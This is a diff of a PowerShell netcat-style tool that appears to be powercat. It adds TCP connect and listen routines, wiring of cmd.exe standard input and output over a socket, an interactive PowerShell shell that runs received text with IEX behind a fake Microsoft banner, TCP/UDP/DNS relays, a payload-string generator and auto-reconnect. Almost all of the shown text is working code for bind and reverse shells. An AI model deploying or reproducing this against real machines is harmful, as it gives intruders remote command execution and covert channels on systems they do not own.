-          $StdOutReadOperation = $Process.StandardOutput.BaseStream.BeginRead($StdOutDestinationBuffer, 0, 65536, $null, $null)
-        }
-        if($StdErrReadOperation.IsCompleted)
-        {
-          $StdErrBytesRead = $Process.StandardError.BaseStream.EndRead($StdErrReadOperation)
-          if($StdErrBytesRead -eq 0){break}
-          WriteToStream $Stream $StdErrDestinationBuffer[0..([int]$StdErrBytesRead-1)] $EndPoint
-          $StdErrReadOperation = $Process.StandardError.BaseStream.BeginRead($StdErrDestinationBuffer, 0, 65536, $null, $null)
-        }
-        if($StreamReadOperation.IsCompleted)
-        {
-          $StreamBytesRead = EndReadFromStream $Stream $StreamReadOperation $EndPoint
-          if($StreamBytesRead -eq 0){break}
-          $Process.StandardInput.WriteLine($Encoding.GetString($StreamDestinationBuffer[0..([int]$StreamBytesRead-1)]).TrimEnd("`r").TrimEnd("`n"))
-          $StreamReadOperation = ReadFromStream $Stream $StreamDestinationBuffer $BufferSize $EndPoint
+          if($FuncVars["l"]){$FuncVars["Socket"].Stop()}
+          else{$FuncVars["Socket"].Close()}
+          $Stopwatch.Stop()
+          break
         }
       }
+      if($Stopwatch.Elapsed.TotalSeconds -gt $t)
+      {
+        if(!$l){$Socket.Close()}
+        else{$Socket.Stop()}
+        $Stopwatch.Stop()
+        break
+      }
+      if($Handle.IsCompleted)
+      {
+        if(!$l)
+        {
+          try
+          {
+            $Socket.EndConnect($Handle)
+            $Stream = $Socket.GetStream()
+            $BufferSize = $Socket.ReceiveBufferSize
+          }
+          catch{$Socket.Close(); $Stopwatch.Stop(); break}
+        }
+        else
+        {
+          $Client = $Socket.EndAcceptTcpClient($Handle)
+          $Stream = $Client.GetStream()
+          $BufferSize = $Client.ReceiveBufferSize
+        }
+        break
+      }
+    }
+    $Stopwatch.Stop()
+    if($Socket -eq $null){break}
+    $FuncVars["Stream"] = $Stream
+    $FuncVars["Socket"] = $Socket
+    $FuncVars["BufferSize"] = $BufferSize
+    $FuncVars["StreamDestinationBuffer"] = (New-Object System.Byte[] $FuncVars["BufferSize"])
+    $FuncVars["StreamReadOperation"] = $FuncVars["Stream"].BeginRead($FuncVars["StreamDestinationBuffer"], 0, $FuncVars["BufferSize"], $null, $null)
+    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
+    $FuncVars["StreamBytesRead"] = 1
+    return $FuncVars
+  }
+  function ReadData_TCP
+  {
+    param($FuncVars)
+    $Data = $null
+    if($FuncVars["StreamBytesRead"] -eq 0){break}
+    if($FuncVars["StreamReadOperation"].IsCompleted)
+    {
+      $StreamBytesRead = $FuncVars["Stream"].EndRead($FuncVars["StreamReadOperation"])
+      if($StreamBytesRead -eq 0){break}
+      $Data = $FuncVars["StreamDestinationBuffer"][0..([int]$StreamBytesRead-1)]
+      $FuncVars["StreamReadOperation"] = $FuncVars["Stream"].BeginRead($FuncVars["StreamDestinationBuffer"], 0, $FuncVars["BufferSize"], $null, $null)
+    }
+    return $Data,$FuncVars
+  }
+  function WriteData_TCP
+  {
+    param($Data,$FuncVars)
+    $FuncVars["Stream"].Write($Data, 0, $Data.Length)
+    return $FuncVars
+  }
+  function Close_TCP
+  {
+    param($FuncVars)
+    try{$FuncVars["Stream"].Close()}
+    catch{}
+    if($FuncVars["l"]){$FuncVars["Socket"].Stop()}
+    else{$FuncVars["Socket"].Close()}
+  }
+  ########## TCP FUNCTIONS ##########
+  
+  ########## CMD FUNCTIONS ##########
+  function Setup_CMD
+  {
+    param($FuncSetupVars)
+    $FuncVars = @{}
+    $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo
+    $ProcessStartInfo.FileName = $FuncSetupVars[0]
+    $ProcessStartInfo.UseShellExecute = $False
+    $ProcessStartInfo.RedirectStandardInput = $True
+    $ProcessStartInfo.RedirectStandardOutput = $True
+    $ProcessStartInfo.RedirectStandardError = $True
+    $FuncVars["Process"] = [System.Diagnostics.Process]::Start($ProcessStartInfo)
+    $FuncVars["Process"].Start() | Out-Null
+    $FuncVars["StdOutDestinationBuffer"] = New-Object System.Byte[] 65536
+    $FuncVars["StdOutReadOperation"] = $FuncVars["Process"].StandardOutput.BaseStream.BeginRead($FuncVars["StdOutDestinationBuffer"], 0, 65536, $null, $null)
+    $FuncVars["StdErrDestinationBuffer"] = New-Object System.Byte[] 65536
+    $FuncVars["StdErrReadOperation"] = $FuncVars["Process"].StandardError.BaseStream.BeginRead($FuncVars["StdErrDestinationBuffer"], 0, 65536, $null, $null)
+    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
+    return $FuncVars
+  }
+  function ReadData_CMD
+  {
+    param($FuncVars)
+    [byte[]]$Data = @()
+    if($FuncVars["StdOutReadOperation"].IsCompleted)
+    {
+      $StdOutBytesRead = $FuncVars["Process"].StandardOutput.BaseStream.EndRead($FuncVars["StdOutReadOperation"])
+      if($StdOutBytesRead -eq 0){break}
+      $Data += $FuncVars["StdOutDestinationBuffer"][0..([int]$StdOutBytesRead-1)]
+      $FuncVars["StdOutReadOperation"] = $FuncVars["Process"].StandardOutput.BaseStream.BeginRead($FuncVars["StdOutDestinationBuffer"], 0, 65536, $null, $null)
+    }
+    if($FuncVars["StdErrReadOperation"].IsCompleted)
+    {
+      $StdErrBytesRead = $FuncVars["Process"].StandardError.BaseStream.EndRead($FuncVars["StdErrReadOperation"])
+      if($StdErrBytesRead -eq 0){break}
+      $Data += $FuncVars["StdErrDestinationBuffer"][0..([int]$StdErrBytesRead-1)]
+      $FuncVars["StdErrReadOperation"] = $FuncVars["Process"].StandardError.BaseStream.BeginRead($FuncVars["StdErrDestinationBuffer"], 0, 65536, $null, $null)
+    }
+    return $Data,$FuncVars
+  }
+  function WriteData_CMD
+  {
+    param($Data,$FuncVars)
+    $FuncVars["Process"].StandardInput.WriteLine($FuncVars["Encoding"].GetString($Data).TrimEnd("`r").TrimEnd("`n"))
+    return $FuncVars
+  }
+  function Close_CMD
+  {
+    param($FuncVars)
+    $FuncVars["Process"] | Stop-Process
+  }  
+  ########## CMD FUNCTIONS ##########
+  
+  ########## POWERSHELL FUNCTIONS ##########
+  function Main_Powershell
+  {
+    param($Stream1SetupVars)
+    try
+    {
+      $ErrorActionPreference = "SilentlyContinue"
+
+      $Stream1Vars = Stream1_Setup $Stream1SetupVars
+      
+      #### Stream2 Setup ###
+      $Encoding = New-Object System.Text.AsciiEncoding
+      $IntroPrompt = $Encoding.GetBytes("Windows PowerShell`nCopyright (C) 2013 Microsoft Corporation. All rights reserved.`n`n" + ("PS " + (pwd).Path + "> "))
+      $Prompt = ("PS " + (pwd).Path + "> ")
+      $Data = $null
+      $CommandToExecute = ""
+      
+      while($True)
+      {
+        ##### Stream2 Read #####
+        $Prompt = $null
+        $ReturnedData = $null
+        if($CommandToExecute -ne "")
+        {
+          try{[byte[]]$ReturnedData = $Encoding.GetBytes((IEX $CommandToExecute 2>&1 | Out-String))}
+          catch{}
+          $Prompt = $Encoding.GetBytes(("PS " + (pwd).Path + "> "))
+        }
+        $Data += $IntroPrompt
+        $IntroPrompt = $null
+        $Data += $ReturnedData
+        $Data += $Prompt
+        $CommandToExecute = ""
+        ##### Stream2 Read #####
+        if($Data -ne $null){$Stream1Vars = Stream1_WriteData $Data $Stream1Vars}
+        $Data = $null
+        
+        $Data,$Stream1Vars = Stream1_ReadData $Stream1Vars
+        if($Data -ne $null){$CommandToExecute = $Encoding.GetString($Data)}
+        $Data = $null
+      }
+    }
+    finally
+    {
+      try
+      {
+        Stream1_Close $Stream1Vars
+      }
+      catch{}
     }
   }
-  finally
+  ########## POWERSHELL FUNCTIONS ##########
+
+  ########## CONSOLE FUNCTIONS ##########
+  function Setup_Console
   {
-    if($o -eq "String"){$OutputString}
-    $ErrorActionPreference= 'SilentlyContinue'
-    try{$Process | Stop-Process}
-    catch{}
-    try{$Stream.Close()}
-    catch{}
+    param($FuncSetupVars)
+    $FuncVars = @{}
+    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
+    $FuncVars["Output"] = $FuncSetupVars[0]
+    $FuncVars["OutputBytes"] = [byte[]]@()
+    $FuncVars["OutputString"] = ""
+    return $FuncVars
+  }
+  function ReadData_Console
+  {
+    param($FuncVars)
+    $Data = $null
+    if($Host.UI.RawUI.KeyAvailable)
+    {
+      $Data = $FuncVars["Encoding"].GetBytes((Read-Host) + "`n")
+    }
+    return $Data,$FuncVars
+  }
+  function WriteData_Console
+  {
+    param($Data,$FuncVars)
+    switch($FuncVars["Output"])
+    {
+      "Host" {Write-Host -n $FuncVars["Encoding"].GetString($Data)}
+      "String" {$FuncVars["OutputString"] += $FuncVars["Encoding"].GetString($Data)}
+      "Bytes" {$FuncVars["OutputBytes"] += $Data}
+    }
+    return $FuncVars
+  }
+  function Close_Console
+  {
+    param($FuncVars)
+    if($FuncVars["OutputString"] -ne ""){return $FuncVars["OutputString"]}
+    elseif($FuncVars["OutputBytes"] -ne @()){return $FuncVars["OutputBytes"]}
+    return
+  }
+  ########## CONSOLE FUNCTIONS ##########
+  
+  ########## MAIN FUNCTION ##########
+  function Main
+  {
+    param($Stream1SetupVars,$Stream2SetupVars)
     try
     {
-      if($l){$Socket.Stop()}
-      else{$Socket.Close()}
+      $ErrorActionPreference = "SilentlyContinue"
+      
+      [byte[]]$InputToWrite = @()
+      if($i -ne $null)
+      {
+        if(Test-Path $i){ [byte[]]$InputToWrite = ([io.file]::ReadAllBytes($i)) }
+        elseif($i.GetType().Name -eq "Byte[]"){ [byte[]]$InputToWrite = $i }
+        elseif($i.GetType().Name -eq "String"){ [byte[]]$InputToWrite = $Encoding.GetBytes($i) }
+        else{Write-Host "Unrecognised input type." ; return}
+      }
+      
+      $Stream1Vars = Stream1_Setup $Stream1SetupVars
+      $Stream2Variables = Stream2_Setup $Stream2SetupVars
+      $Data = $null
+      
+      if($InputToWrite -ne @())
+      {
+        $Stream1Vars = Stream1_WriteData $InputToWrite $Stream1Vars
+      }
+      
+      if($d){break}
+      
+      while($True)
+      {
+        $Data,$Stream2Variables = Stream2_ReadData $Stream2Variables
+        if($Data -ne $null){$Stream1Vars = Stream1_WriteData $Data $Stream1Vars}
+        $Data = $null
+      
+        $Data,$Stream1Vars = Stream1_ReadData $Stream1Vars
+        if($Data -ne $null){$Stream2Variables = Stream2_WriteData $Data $Stream2Variables}
+        $Data = $null
+      }
     }
-    catch{}
-    try{$RelayStream.Close()}
-    catch{}
-    try
+    finally
     {
-      if($r.Contains(":")){$RelaySocket.Close()}
-      else{$RelaySocket.Stop()}
+      try
+      {
+        Stream2_Close $Stream2Variables
+      }
+      catch{}
+      try
+      {
+        Stream1_Close $Stream1Vars
+      }
+      catch{}
     }
-    catch{}
+  }
+  ########## MAIN FUNCTION ##########
+  
+  ########## GENERATE PAYLOAD ##########
+  if($u)
+  {
+    $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_UDP} + "`n}`n`n")
+    $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_UDP} + "`n}`n`n")
+    $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_UDP} + "`n}`n`n")
+    $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_UDP} + "`n}`n`n")    
+    if($l){$InvokeString = "Main @('',`$True,'$p','$t') "}
+    else{$InvokeString = "Main @('$c',`$False,'$p','$t') "}
+  }
+  elseif($dns -ne "")
+  {
+    $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_DNS} + "`n}`n`n")
+    $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_DNS} + "`n}`n`n")
+    $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_DNS} + "`n}`n`n")
+    $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_DNS} + "`n}`n`n")
+    if($l){return "This feature is not available."}
+    else{$InvokeString = "Main @('$c','$p','$Domain',$dnsft) "}
+  }
+  else
+  {
+    $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_TCP} + "`n}`n`n")
+    $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_TCP} + "`n}`n`n")
+    $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_TCP} + "`n}`n`n")
+    $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_TCP} + "`n}`n`n")
+    if($l){$InvokeString = "Main @('',`$True,$p,$t) "}
+    else{$InvokeString = "Main @('$c',`$False,$p,$t) "}
+  }
+  
+  if($e -ne "")
+  {
+    $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_CMD} + "`n}`n`n")
+    $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_CMD} + "`n}`n`n")
+    $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_CMD} + "`n}`n`n")
+    $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_CMD} + "`n}`n`n")
+    $InvokeString += "@('$e')`n`n"
+  }
+  elseif($ep)
+  {
+    $InvokeString += "`n`n"
+  }
+  elseif($r -ne "")
+  {
+    if($r.split(":")[0].ToLower() -eq "udp")
+    {
+      $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_UDP} + "`n}`n`n")
+      $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_UDP} + "`n}`n`n")
+      $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_UDP} + "`n}`n`n")
+      $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_UDP} + "`n}`n`n")    
+      if($r.split(":").Count -eq 2){$InvokeString += ("@('',`$True,'" + $r.split(":")[1] + "','$t') ")}
+      elseif($r.split(":").Count -eq 3){$InvokeString += ("@('" + $r.split(":")[1] + "',`$False,'" + $r.split(":")[2] + "','$t') ")}
+      else{return "Bad relay format."}
+    }
+    if($r.split(":")[0].ToLower() -eq "dns")
+    {
+      $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_DNS} + "`n}`n`n")
+      $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_DNS} + "`n}`n`n")
+      $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_DNS} + "`n}`n`n")
+      $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_DNS} + "`n}`n`n")
+      if($r.split(":").Count -eq 2){return "This feature is not available."}
+      elseif($r.split(":").Count -eq 4){$InvokeString += ("@('" + $r.split(":")[1] + "','" + $r.split(":")[2] + "','" + $r.split(":")[3] + "',$dnsft)) ")}
+      else{return "Bad relay format."}
+    }
+    elseif($r.split(":")[0].ToLower() -eq "tcp")
+    {
+      $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_TCP} + "`n}`n`n")
+      $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_TCP} + "`n}`n`n")
+      $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_TCP} + "`n}`n`n")
+      $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_TCP} + "`n}`n`n")
+      if($r.split(":").Count -eq 2){$InvokeString += ("@('',`$True,'" + $r.split(":")[1] + "','$t') ")}
+      elseif($r.split(":").Count -eq 3){$InvokeString += ("@('" + $r.split(":")[1] + "',`$False,'" + $r.split(":")[2] + "','$t') ")}
+      else{return "Bad relay format."}
+    }
+  }
+  else
+  {
+    $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_Console} + "`n}`n`n")
+    $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_Console} + "`n}`n`n")
+    $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_Console} + "`n}`n`n")
+    $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_Console} + "`n}`n`n")
+    $InvokeString += ("@('" + $o + "')")
+  }
+  
+  if($ep){$FunctionString += ("function Main`n{`n" + ${function:Main_Powershell} + "`n}`n`n")}
+  else{$FunctionString += ("function Main`n{`n" + ${function:Main} + "`n}`n`n")}
+  $InvokeString = ($FunctionString + $InvokeString)
+  ########## GENERATE PAYLOAD ##########
+  
+  if($rep)
+  {
+    while($True)
+    {
+      IEX $InvokeString
+      Start-Sleep -s 2
+      Write-Verbose "Repetition Enabled: Restarting..."
+    }
+  }
+  else
+  {
+    IEX $InvokeString
   }
 }
